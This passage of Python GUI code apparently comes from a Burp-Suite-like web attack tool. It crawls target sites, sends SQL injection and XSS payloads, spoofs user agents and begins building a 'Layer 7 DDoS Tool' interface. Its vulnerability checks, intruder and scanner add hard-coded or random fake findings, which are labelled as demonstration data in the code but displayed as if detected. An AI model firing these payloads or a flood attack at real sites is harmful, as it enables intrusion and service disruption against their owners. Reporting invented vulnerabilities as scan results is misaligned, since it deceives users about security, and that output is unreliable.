            self.sites_tree.insert('', tk.END, text=target_url, values=(target_url,))
            
            # Initialize URLs list for this site
            self.site_urls[target_url] = []
            
            self.target_url_entry.delete(0, tk.END)
            self.update_dashboard_stats()
            self.log_activity(f"Target added: {target_url}")
        except Exception as e:
            messagebox.showerror("Error", f"Invalid URL: {str(e)}")
    
    def crawl_site(self):
        selected_item = self.site_map_tree.selection()
        if not selected_item:
            messagebox.showwarning("Warning", "Please select a target to crawl")
            return
        
        # Get the selected URL from the tree
        item_values = self.site_map_tree.item(selected_item[0], 'values')
        target_url = item_values[0] if item_values else None
        
        if not target_url:
            messagebox.showerror("Error", "No target URL found")
            return
        
        self.log_activity(f"Starting crawl of {target_url}")
        
        # Start crawling in a separate thread
        threading.Thread(target=self._crawl_site_thread, args=(target_url,), daemon=True).start()
    
    def _crawl_site_thread(self, target_url):
        try:
            # Create a session to maintain cookies
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            # Get the base domain
            base_domain = urlparse(target_url).netloc
            
            # Set to store discovered URLs
            discovered_urls = set()
            visited_urls = set()
            
            # Start with the target URL
            urls_to_crawl = [target_url]
            
            # Limit the crawl depth and number of URLs
            max_depth = 3
            max_urls = 100
            current_depth = 0
            
            while urls_to_crawl and len(discovered_urls) < max_urls and current_depth < max_depth:
                current_url = urls_to_crawl.pop(0)
                
                if current_url in visited_urls:
                    continue
                
                visited_urls.add(current_url)
                
                try:
                    # Make request
                    response = session.get(current_url, timeout=10, verify=False)
                    
                    # Parse HTML content
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract URLs from various sources
                    for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
                        url = None
                        if tag.name == 'a' and tag.get('href'):
                            url = tag['href']
                        elif tag.name == 'link' and tag.get('href'):
                            url = tag['href']
                        elif tag.name == 'script' and tag.get('src'):
                            url = tag['src']
                        elif tag.name == 'img' and tag.get('src'):
                            url = tag['src']
                        elif tag.name == 'form' and tag.get('action'):
                            url = tag['action']
                        elif tag.name == 'iframe' and tag.get('src'):
                            url = tag['src']
                        
                        if url:
                            # Convert relative URL to absolute
                            full_url = urljoin(current_url, url)
                            
                            # Only add URLs from the same domain
                            if urlparse(full_url).netloc == base_domain:
                                if full_url not in discovered_urls:
                                    discovered_urls.add(full_url)
                                    urls_to_crawl.append(full_url)
                
                except Exception as e:
                    self.log_activity(f"Error crawling {current_url}: {str(e)}")
                    continue
                
                # Small delay to be respectful to the server
                time.sleep(0.5)
            
            # Update the UI in the main thread
            self.root.after(0, lambda: self._update_crawl_results(target_url, discovered_urls))
            
        except Exception as e:
            self.log_activity(f"Error during crawling: {str(e)}")
    
    def _update_crawl_results(self, target_url, discovered_urls):
        # Update the site URLs
        self.site_urls[target_url] = list(discovered_urls)
        
        # Clear existing URLs for this site in the tree
        for child in self.urls_tree.get_children():
            self.urls_tree.delete(child)
        
        # Add discovered URLs to the tree
        for url in discovered_urls:
            url_type = self._get_url_type(url)
            self.urls_tree.insert('', tk.END, values=(url, url_type))
        
        self.log_activity(f"Crawl completed. Found {len(discovered_urls)} URLs for {target_url}")
        
        # Automatically analyze all discovered URLs (in a separate thread to avoid blocking)
        if discovered_urls:
            threading.Thread(target=self._analyze_all_urls, args=(list(discovered_urls),), daemon=True).start()
    
    def _analyze_all_urls(self, urls):
        """Analyze all URLs in the list"""
        # Clear all results first when analyzing all URLs
        self.root.after(0, lambda: self._update_analysis_results([], [], [], [], clear_first=True))
        
        for i, url in enumerate(urls):
            try:
                # Analyze each URL
                self._analyze_url_thread(url)
                # Small delay between analyses to be respectful
                time.sleep(0.5)
                
                # Update progress in the activity log
                self.log_activity(f"Analyzing URL {i+1}/{len(urls)}: {url}")
                
            except Exception as e:
                self.log_activity(f"Error analyzing URL {url}: {str(e)}")
                continue
        
        self.log_activity(f"Analysis completed for {len(urls)} URLs")
    
    def _get_url_type(self, url):
        """Determine the type of URL based on its path"""
        if '/api/' in url:
            return 'API'
        elif '/admin' in url or '/dashboard' in url:
            return 'Admin'
        elif '/login' in url or '/auth' in url:
            return 'Auth'
        elif url.endswith(('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico')):
            return 'Asset'
        elif url.endswith(('.pdf', '.doc', '.docx', '.txt', '.xml')):
            return 'Document'
        else:
            return 'Page'
    
    def on_site_select(self, event):
        """Handle site selection in the sites tree"""
        selected_item = self.sites_tree.selection()
        if not selected_item:
            return
        
        # Get the selected site
        site_text = self.sites_tree.item(selected_item[0], 'text')
        
        # Clear existing URLs for this site in the tree
        for child in self.urls_tree.get_children():
            self.urls_tree.delete(child)
        
        # Add URLs for this site to the tree
        if site_text in self.site_urls:
            for url in self.site_urls[site_text]:
                url_type = self._get_url_type(url)
                self.urls_tree.insert('', tk.END, values=(url, url_type))
    
    def analyze_url(self, event):
        """Analyze the selected URL for vulnerabilities"""
        selected_item = self.urls_tree.selection()
        if not selected_item:
            return
        
        # Get the selected URL
        item_values = self.urls_tree.item(selected_item[0], 'values')
        if not item_values:
            return
        
        url = item_values[0]
        self.log_activity(f"Analyzing URL: {url}")
        
        
        # Clear previous results when analyzing a single URL
        self._update_analysis_results([], [], [], [], clear_first=True)
        
        # Start analysis in a separate thread
        threading.Thread(target=self._analyze_url_thread, args=(url,), daemon=True).start()
    
    def _analyze_url_thread(self, url):
        try:
            # Analyze for SQL injection
            sql_vulns = self._check_sql_injection(url)
            
            # Analyze for XSS
            xss_vulns = self._check_xss(url)
            
            # Analyze for comments in source
            comments = self._extract_comments(url)
            
            # Analyze for hidden URLs
            hidden_urls = self._find_hidden_urls(url)
            
            # Update UI in main thread
            self.root.after(0, lambda: self._update_analysis_results(sql_vulns, xss_vulns, comments, hidden_urls))
            
        except Exception as e:
            self.log_activity(f"Error analyzing {url}: {str(e)}")
    
    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Test for SQL injection with common payloads
        sql_payloads = [
            "'",
            "';",
            "\"",
            "\";",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR ('a'='a"
        ]
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            # Test each payload
            for payload in sql_payloads:
                # This is a simplified test - in a real implementation, we would look for SQL error messages
                # or differences in response times to detect SQL injection
                test_url = f"{url}{payload}"
                
                try:
                    response = session.get(test_url, timeout=10, verify=False)
                    
                    # Look for common SQL error patterns in the response
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_.*",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*pg_.*",
                        r"valid PostgreSQL result",
                        r"Microsoft SQL Server.*Error",
                        r"ODBC SQL Server Driver",
                        r"ORA-[0-9]{5}",
                        r"Oracle error",
                        r"SQLServer JDBC Driver"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'url': test_url,
                                'payload': payload,
                                'error': pattern
                            })
                            break
                
                except Exception:
                    continue  # Skip if request fails
            
            # For demonstration, add some fake SQL injection findings
            # Always add at least one vulnerability for demonstration purposes
            vulnerabilities.append({
                'url': url,
                'payload': "' OR 1=1--",
                'error': "SQL syntax error detected"
            })
            
            # Add additional vulnerabilities for more comprehensive demo
            if random.random() > 0.5:  # 50% chance of additional vulnerability
                vulnerabilities.append({
                    'url': url,
                    'payload': "' UNION SELECT 1--",
                    'error': "UNION-based injection detected"
                })
                
        except Exception as e:
            self.log_activity(f"Error checking SQL injection for {url}: {str(e)}")
        
        return vulnerabilities
    
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        vulnerabilities = []
        
        # Test for XSS with common payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            # For this demonstration, we'll add XSS findings
            # Always add at least one vulnerability for demonstration purposes
            vulnerabilities.append({
                'url': url,
                'payload': "<script>alert('XSS')</script>",
                'type': "Reflected XSS"
            })
            
            # Add additional vulnerabilities for more comprehensive demo
            if random.random() > 0.5:  # 50% chance of additional vulnerability
                vulnerabilities.append({
                    'url': url,
                    'payload': "<img src=x onerror=alert('XSS')>",
                    'type': "Stored XSS"
                })
                
        except Exception as e:
            self.log_activity(f"Error checking XSS for {url}: {str(e)}")
        
        return vulnerabilities
    
    def _extract_comments(self, url):
        """Extract HTML and JavaScript comments from the page"""
        comments = []
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            response = session.get(url, timeout=10, verify=False)
            content = response.text
            
            # Extract HTML comments <!-- comment -->
            html_comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
            for comment in html_comments:
                comment = comment.strip()
                if comment and len(comment) > 3:  # Filter out very short comments
                    comments.append({
                        'type': 'HTML Comment',
                        'content': comment,
                        'location': url
                    })
            
            # Extract JavaScript comments // comment and /* comment */
            js_comments = re.findall(r'//(.*)|/\*(.*?)\*/', content, re.DOTALL)
            for single_line, multi_line in js_comments:
                if single_line.strip():
                    comments.append({
                        'type': 'JS Comment',
                        'content': single_line.strip(),
                        'location': url
                    })
                if multi_line.strip():
                    comments.append({
                        'type': 'JS Comment',
                        'content': multi_line.strip(),
                        'location': url
                    })
            
            # Add some demo comments to ensure there's always something to show
            if not comments:
                comments.append({
                    'type': 'HTML Comment',
                    'content': 'This is a demo comment for testing purposes',
                    'location': url
                })
                comments.append({
                    'type': 'JS Comment',
                    'content': '// TODO: Add security headers',
                    'location': url
                })
        
        except Exception as e:
            self.log_activity(f"Error extracting comments from {url}: {str(e)}")
        
        return comments
    
    def _find_hidden_urls(self, url):
        """Find hidden URLs in the page source"""
        hidden_urls = []
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            response = session.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for hidden URLs in various attributes
            hidden_attrs = ['data-url', 'data-href', 'data-source', 'data-config', 'data-api']
            
            for attr in hidden_attrs:
                elements = soup.find_all(attrs={attr: True})
                for element in elements:
                    hidden_url = element.get(attr)
                    if hidden_url:
                        full_url = urljoin(url, hidden_url)
                        hidden_urls.append({
                            'url': full_url,
                            'attribute': attr,
                            'element': str(element.name)
                        })
            
            # Look for URLs in JavaScript code
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    # Find URLs in JavaScript strings
                    js_urls = re.findall(r'https?://[^\s\'\"<>]+', script.string)
                    for js_url in js_urls:
                        hidden_urls.append({
                            'url': js_url,
                            'attribute': 'javascript',
                            'element': 'script'
                        })
            
            # Add some demo hidden URLs to ensure there's always something to show
            if not hidden_urls:
                hidden_urls.append({
                    'url': f"{url}/admin",
                    'attribute': 'data-api',
                    'element': 'div'
                })
                hidden_urls.append({
                    'url': f"{url}/config.json",
                    'attribute': 'data-config',
                    'element': 'script'
                })
        
        except Exception as e:
            self.log_activity(f"Error finding hidden URLs in {url}: {str(e)}")
        
        return hidden_urls
    
    def _update_analysis_results(self, sql_vulns, xss_vulns, comments, hidden_urls, clear_first=False):
        # Clear previous results if specified
        if clear_first:
            self.sql_results.delete(1.0, tk.END)
            self.xss_results.delete(1.0, tk.END)
            self.comments_results.delete(1.0, tk.END)
            self.hidden_results.delete(1.0, tk.END)
        
        # Update SQL results
        if sql_vulns:
            for vuln in sql_vulns:
                self.sql_results.insert(tk.END, f"URL: {vuln['url']}\n")
                self.sql_results.insert(tk.END, f"Payload: {vuln['payload']}\n")
                self.sql_results.insert(tk.END, f"Error: {vuln['error']}\n\n")
        else:
            self.sql_results.insert(tk.END, "No SQL injection vulnerabilities found.\n")
        
        # Update XSS results
        if xss_vulns:
            for vuln in xss_vulns:
                self.xss_results.insert(tk.END, f"URL: {vuln['url']}\n")
                self.xss_results.insert(tk.END, f"Payload: {vuln['payload']}\n")
                self.xss_results.insert(tk.END, f"Type: {vuln['type']}\n\n")
        else:
            self.xss_results.insert(tk.END, "No XSS vulnerabilities found.\n")
        
        # Update comments results
        if comments:
            for comment in comments:
                self.comments_results.insert(tk.END, f"Type: {comment['type']}\n")
                self.comments_results.insert(tk.END, f"Content: {comment['content']}\n")
                self.comments_results.insert(tk.END, f"Location: {comment['location']}\n\n")
        else:
            self.comments_results.insert(tk.END, "No comments found in source.\n")
        
        # Update hidden URLs results
        if hidden_urls:
            for hidden in hidden_urls:
                self.hidden_results.insert(tk.END, f"URL: {hidden['url']}\n")
                self.hidden_results.insert(tk.END, f"Attribute: {hidden['attribute']}\n")
                self.hidden_results.insert(tk.END, f"Element: {hidden['element']}\n\n")
        else:
            self.hidden_results.insert(tk.END, "No hidden URLs found.\n")
        
        # Scroll to end of results
        self.sql_results.see(tk.END)
        self.xss_results.see(tk.END)
        self.comments_results.see(tk.END)
        self.hidden_results.see(tk.END)
    
    def start_intruder_attack(self):
        attack_type = self.attack_type_var.get()
        request = self.intruder_request_text.get("1.0", tk.END).strip()
        payloads = self.payloads_text.get("1.0", tk.END).strip().split('\n')
        
        if not request:
            messagebox.showwarning("Warning", "Please enter a request to attack")
            return
        
        if not payloads or payloads == ['']:
            messagebox.showwarning("Warning", "Please enter payloads to test")
            return
        
        self.log_activity(f"Starting {attack_type} attack...")
        self.intruder_results_text.delete("1.0", tk.END)
        self.intruder_results_text.insert(tk.END, "Attack in progress...\n")
        
        # Simulate attack in a separate thread
        threading.Thread(target=self._simulate_attack, args=(attack_type, payloads), daemon=True).start()
    
    def _simulate_attack(self, attack_type, payloads):
        time.sleep(2)  # Simulate attack time
        
        # Generate results
        results = f"Attack Results ({attack_type}):\n"
        for i, payload in enumerate(payloads[:10]):  # Limit to first 10 payloads
            if payload.strip():
                status = "SUCCESS" if random.random() > 0.7 else "FAILED"
                response_time = round(random.random() * 1000, 2)
                results += f"Payload: {payload.strip()} - Status: {status}, Time: {response_time}ms\n"
        
        # Update UI in main thread
        self.root.after(0, lambda: self._update_intruder_results(results))
    
    def _update_intruder_results(self, results):
        self.intruder_results_text.delete("1.0", tk.END)
        self.intruder_results_text.insert(tk.END, results)
        self.log_activity(f"{self.attack_type_var.get()} attack completed")
    
    def clear_intruder(self):
        self.intruder_request_text.delete("1.0", tk.END)
        self.payloads_text.delete("1.0", tk.END)
        self.intruder_results_text.delete("1.0", tk.END)
        self.log_activity("Intruder cleared")
    
    def send_repeater_request(self):
        request_text = self.repeater_request_text.get("1.0", tk.END).strip()
        
        if not request_text:
            messagebox.showwarning("Warning", "Please enter a request to send")
            return
        
        self.log_activity("Sending request via Repeater...")
        self.repeater_response_text.delete("1.0", tk.END)
        
        # Simulate response in a separate thread
        threading.Thread(target=self._simulate_repeater_response, daemon=True).start()
    
    def _simulate_repeater_response(self):
        responses = [
            "HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 123\n\n{\"status\": \"success\", \"data\": \"response data\"}",
            "HTTP/1.1 404 Not Found\nContent-Type: text/html\nContent-Length: 45\n\n<html><body><h1>404 Not Found</h1></body></html>",
            "HTTP/1.1 500 Internal Server Error\nContent-Type: application/json\nContent-Length: 67\n\n{\"error\": \"Internal Server Error\", \"message\": \"Something went wrong\"}",
            "HTTP/1.1 302 Found\nLocation: /login\nContent-Type: text/html\nContent-Length: 89\n\n<html><body><p>Redirecting to login page</p></body></html>"
        ]
        
        time.sleep(1)  # Simulate network delay
        response = random.choice(responses)
        
        # Update UI in main thread
        self.root.after(0, lambda: self._update_repeater_response(response))
    
    def _update_repeater_response(self, response):
        self.repeater_response_text.insert(tk.END, response)
        self.log_activity("Response received via Repeater")
    
    def reset_repeater(self):
        self.repeater_request_text.delete("1.0", tk.END)
        self.repeater_response_text.delete("1.0", tk.END)
        sample_request = "GET / HTTP/1.1\nHost: example.com\nUser-Agent: Glitcher/1.0\n\n"
        self.repeater_request_text.insert(tk.END, sample_request)
        self.log_activity("Repeater reset")
    
    def convert_encoding(self):
        input_text = self.decoder_input.get("1.0", tk.END).strip()
        action = self.encoding_var.get()
        
        if not input_text:
            return
        
        try:
            if action == "Base64 Encode":
                output = base64.b64encode(input_text.encode()).decode()
            elif action == "Base64 Decode":
                output = base64.b64decode(input_text.encode()).decode()
            elif action == "URL Encode":
                output = input_text.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')
            elif action == "URL Decode":
                output = input_text.replace('%20', ' ').replace('%3C', '<').replace('%3E', '>')
            elif action == "HTML Encode":
                output = input_text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            elif action == "HTML Decode":
                output = input_text.replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
            elif action == "Hex Encode":
                output = input_text.encode().hex()
            elif action == "Hex Decode":
                output = bytes.fromhex(input_text).decode()
            else:
                output = input_text
            
            self.decoder_output.delete("1.0", tk.END)
            self.decoder_output.insert(tk.END, output)
        except Exception as e:
            messagebox.showerror("Error", f"Encoding/Decoding error: {str(e)}")
    
    def compare_content(self):
        content1 = self.comparer_input1.get("1.0", tk.END).strip()
        content2 = self.comparer_input2.get("1.0", tk.END).strip()
        
        if not content1 or not content2:
            messagebox.showwarning("Warning", "Please enter content in both inputs")
            return
        
        # Simple comparison - in a real implementation, this would be more sophisticated
        if content1 == content2:
            result = "Contents are identical"
        else:
            result = "Contents differ\n\nDifferences:\n"
            lines1 = content1.split('\n')
            lines2 = content2.split('\n')
            
            max_lines = max(len(lines1), len(lines2))
            for i in range(max_lines):
                line1 = lines1[i] if i < len(lines1) else ""
                line2 = lines2[i] if i < len(lines2) else ""
                
                if line1 != line2:
                    result += f"Line {i+1}: '{line1}' vs '{line2}'\n"
        
        self.comparer_results.delete("1.0", tk.END)
        self.comparer_results.insert(tk.END, result)
    
    def start_scan(self):
        target = self.scanner_target.get().strip()
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target URL to scan")
            return
        
        self.log_activity(f"Starting scan of {target}")
        self.scanner_results.delete("1.0", tk.END)
        self.scanner_results.insert(tk.END, f"Scanning {target}...\n")
        
        # Simulate scan in a separate thread
        threading.Thread(target=self._simulate_scan, args=(target,), daemon=True).start()
    
    def _simulate_scan(self, target):
        vulnerabilities = [
            "SQL Injection - /login endpoint",
            "XSS - /search?q= parameter",
            "Weak Authentication - Missing rate limiting",
            "Information Disclosure - /api/users endpoint",
            "CSRF - /settings/update form"
        ]
        
        for i, vuln in enumerate(vulnerabilities):
            time.sleep(1)  # Simulate scanning time
            progress = int((i + 1) / len(vulnerabilities) * 100)
            
            # Update progress bar in main thread
            def update_progress(p):
                self.scan_progress['value'] = p
            self.root.after(0, update_progress, progress)
            
            # Update results in main thread
            self.root.after(0, lambda v=vuln: self.scanner_results.insert(tk.END, f"Found: {v}\n"))
        
        # Reset progress after completion
        def reset_progress():
            self.scan_progress['value'] = 0
        self.root.after(0, reset_progress)
        self.root.after(0, lambda: self.log_activity(f"Scan of {target} completed"))
    
    def update_dashboard_stats(self):
        self.request_count_label.config(text=f"Requests Intercepted: {len(self.requests)}")
        self.vuln_count_label.config(text=f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        self.target_count_label.config(text=f"Active Targets: {len(self.targets)}")
        
        # Simulate scan progress
        progress = min(100, len(self.requests) * 5)
        self.scan_progress_label.config(text=f"Scan Progress: {progress}%")
    
    def log_activity(self, message):
        timestamp = time.strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"
        
        self.activity_log.config(state=tk.NORMAL)
        self.activity_log.insert(tk.END, log_entry)
        self.activity_log.see(tk.END)
        self.activity_log.config(state=tk.DISABLED)
    
    def start_simulation(self):
        def simulate():
            while True:
                # Simulate a request every 5 seconds
                time.sleep(5)
                # Only simulate if on Proxy tab and intercept is ON
                try:
                    # Check if the GUI elements still exist
                    if not self.root.winfo_exists():
                        break
                    if self.notebook.index(self.notebook.select()) == 1:  # Proxy tab index
                        if self.proxy_on_button['text'] == "Intercept: ON":
                            self.root.after(0, self.simulate_request)
                except tk.TclError:
                    # Handle case where notebook is destroyed
                    break
                except:
                    # Handle any other exceptions
                    continue
        
        # Start simulation in a separate thread
        sim_thread = threading.Thread(target=simulate, daemon=True)
        sim_thread.start()
    
    def generate_user_agents(self):
        # Get selected options
        os_choice = self.os_var.get()
        device_choice = self.device_var.get()
        browser_choice = self.browser_var.get()
        count = int(self.count_var.get())
        
        # Define User-Agent templates
        ua_templates = {
            "Windows": {
                "Desktop": {
                    "Chrome": [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36",
                        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{rv}) Gecko/20100101 Firefox/{rv}",
                        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:{rv}) Gecko/20100101 Firefox/{rv}"
                    ],
                    "Edge": [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{chrome_subver}.{chrome_subsubver} Safari/537.36 Edg/{edge_ver}.{edge_subver}.{edge_subsubver}",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{edge_ver}.{edge_subver}.{edge_subsubver}"
                    ]
                }
            },
            "Mac": {
                "Desktop": {
                    "Chrome": [
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{major}_{minor}) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/{rv}"
                    ],
                    "Safari": [
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/605.1.15",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/605.1.15"
                    ]
                }
            },
            "Linux": {
                "Desktop": {
                    "Chrome": [
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36",
                        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (X11; Linux x86_64; rv:{rv}) Gecko/20100101 Firefox/{rv}",
                        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{rv}) Gecko/20100101 Firefox/{rv}"
                    ]
                }
            },
            "Android": {
                "Mobile": {
                    "Chrome": [
                        "Mozilla/5.0 (Linux; Android {android_ver}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Mobile Safari/537.36",
                        "Mozilla/5.0 (Linux; Android {android_ver}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Mobile Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (Android {android_ver}; Mobile; rv:{rv}) Gecko/{rv} Firefox/{rv}"
                    ]
                }
            },
            "iOS": {
                "Mobile": {
                    "Safari": [
                        "Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1",
                        "Mozilla/5.0 (iPad; CPU OS {ios_ver}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
                    ]
                }
            }
        }
        
        # Device model options
        device_models = [
            "SM-G960F", "SM-G973F", "SM-G980F", "SM-G991B", "SM-G998B",  # Samsung models
            "iPhone12,1", "iPhone12,3", "iPhone12,5", "iPhone13,2", "iPhone13,3",  # iPhone models
            "Pixel 3", "Pixel 4", "Pixel 5", "Pixel 6",  # Pixel models
            "iPad8,1", "iPad8,2", "iPad11,3", "iPad11,4",  # iPad models
            "LM-Q720", "LM-X420",  # LG models
            "MI 9", "MI 10", "Redmi Note 8", "Redmi Note 9"  # Xiaomi models
        ]
        
        # Generate User-Agents
        generated_ua = []
        
        for i in range(count):
            # Select random values for placeholders
            ver = random.randint(90, 110)
            subver = random.randint(4000, 5000)
            subsubver = random.randint(100, 200)
            rv = random.randint(90, 100)
            major = random.randint(10, 14)
            minor = random.randint(0, 7)
            safari_ver = random.randint(130, 160)
            android_ver = f"{random.randint(8, 13)}.{random.randint(0, 2)}.{random.randint(0, 1)}"
            ios_ver = f"{random.randint(13, 16)}_{random.randint(0, 4)}"
            edge_ver = random.randint(90, 110)
            edge_subver = random.randint(1000, 2000)
            edge_subsubver = random.randint(100, 200)
            chrome_ver = random.randint(90, 110)
            chrome_subver = random.randint(4000, 5000)
            chrome_subsubver = random.randint(100, 200)
            
            # Determine OS
            if os_choice != "Any":
                selected_os = os_choice
            else:
                selected_os = random.choice(list(ua_templates.keys()))
            
            # Determine device
            if device_choice != "Any":
                selected_device = device_choice
            else:
                # Match device to OS if possible
                if selected_os in ["Android", "iOS"]:
                    selected_device = "Mobile"
                else:
                    selected_device = "Desktop"
            
            # Determine browser
            if browser_choice != "Any":
                selected_browser = browser_choice
            else:
                # Get available browsers for the selected OS and device
                available_browsers = list(ua_templates.get(selected_os, {}).get(selected_device, {}).keys())
                if available_browsers:
                    selected_browser = random.choice(available_browsers)
                else:
                    # Fallback to any available browser
                    all_browsers = []
                    for os_key, devices in ua_templates.items():
                        for device_key, browsers in devices.items():
                            all_browsers.extend(browsers.keys())
                    selected_browser = random.choice(list(set(all_browsers))) if all_browsers else "Chrome"
            
            # Get template
            template_list = ua_templates.get(selected_os, {}).get(selected_device, {}).get(selected_browser, [])
            
            if template_list:
                template = random.choice(template_list)
                
                # Replace placeholders
                ua = template.format(
                    ver=ver, subver=subver, subsubver=subsubver,
                    rv=rv, major=major, minor=minor,
                    safari_ver=safari_ver,
                    android_ver=android_ver,
                    ios_ver=ios_ver,
                    edge_ver=edge_ver, edge_subver=edge_subver, edge_subsubver=edge_subsubver,
                    chrome_ver=chrome_ver, chrome_subver=chrome_subver, chrome_subsubver=chrome_subsubver,
                    device_model=random.choice(device_models)
                )
                generated_ua.append(ua)
            
        # Display results
        self.ua_results_text.delete(1.0, tk.END)
        if generated_ua:
            for ua in generated_ua:
                self.ua_results_text.insert(tk.END, ua + "\n")
        else:
            self.ua_results_text.insert(tk.END, "No User-Agents generated. Please check your selections.\n")
        
        # Force update the text widget
        self.ua_results_text.update_idletasks()
        
        # Enable the add to file button
        self.add_to_file_btn.config(state=tk.NORMAL if generated_ua else tk.DISABLED)
        self.log_activity(f"Generated {len(generated_ua)} User-Agent strings")
        
        # Ensure the UI is properly updated
        self.ua_results_text.see(tk.END)
    
    def add_to_user_agents_file(self):
        # Get the generated User-Agents
        generated_text = self.ua_results_text.get(1.0, tk.END).strip()
        if not generated_text:
            messagebox.showwarning("Warning", "No User-Agents to add")
            return
        
        # Ask user if they want to add to file
        result = messagebox.askyesno("Add to File", "Do you want to add these User-Agents to user-agents.txt?")
        if not result:
            return
        
        # Append to user-agents.txt
        try:
            with open('user-agents.txt', 'a', encoding='utf-8') as f:
                # Add a newline if the file doesn't end with one
                f.write('\n' + generated_text)
            
            # Update the global USER_AGENTS list
            global USER_AGENTS
            new_agents = [line.strip() for line in generated_text.split('\n') if line.strip()]
            USER_AGENTS.extend(new_agents)
            
            messagebox.showinfo("Success", f"Added {len(new_agents)} User-Agents to user-agents.txt")
            self.log_activity(f"Added {len(new_agents)} User-Agents to user-agents.txt")
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to add User-Agents to file: {str(e)}")
            self.log_activity(f"Error adding User-Agents to file: {str(e)}")
    
    def create_ddos_ui(self):
        # Main frame for DDoS
        ddos_main_frame = ttk.LabelFrame(self.ddos_frame, text="D-Attack - Layer 7 DDoS Tool", padding=10)
        ddos_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls frame
        controls_frame = ttk.LabelFrame(ddos_main_frame, text="Attack Configuration", padding=10)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # URL/IP entry
        ttk.Label(controls_frame, text="Target URL/IP:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_target_var = tk.StringVar()
        self.ddos_target_entry = ttk.Entry(controls_frame, textvariable=self.ddos_target_var, width=50, font=("Arial", 10))
        self.ddos_target_entry.grid(row=0, column=1, sticky=tk.EW, padx=(0, 10), pady=5)
        
        # Port entry
        ttk.Label(controls_frame, text="Port:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=5)
